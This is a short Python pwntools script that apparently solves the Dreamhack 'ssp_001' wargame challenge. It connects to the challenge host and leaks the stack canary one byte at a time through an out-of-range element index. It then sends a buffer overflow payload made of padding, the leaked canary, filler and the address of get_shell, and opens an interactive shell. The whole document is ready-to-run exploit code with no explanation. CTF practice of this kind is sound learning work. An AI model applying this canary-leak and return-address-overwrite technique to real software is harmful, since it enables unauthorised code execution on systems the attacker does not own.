from pwn import *
def slog(n,m) :
	return success(" : ".join([n,hex(m)]))
e=ELF("./ssp_001")
r=remote("host3.dreamhack.games", 17001)

get_shell = e.symbols['get_shell']
canary=b""
i=131
while i >= 128:
	r.recvuntil(b"> ")
	r.send(b'P')
	r.sendlineafter(b"Element index : ",str(i))
	r.recvuntil(b"is : ") 
	canary +=r.recvn(2)
	i=i-1

canary = int(canary,16)
slog("canary",canary)

r.sendlineafter(b"> ", 'E')
r.sendlineafter(b"Size : ",str(1000))
payload=b"A"*64 + p32(canary) + b"B"*8 +p32(get_shell)

r.sendlineafter(b"Name : ",payload)
r.interactive()
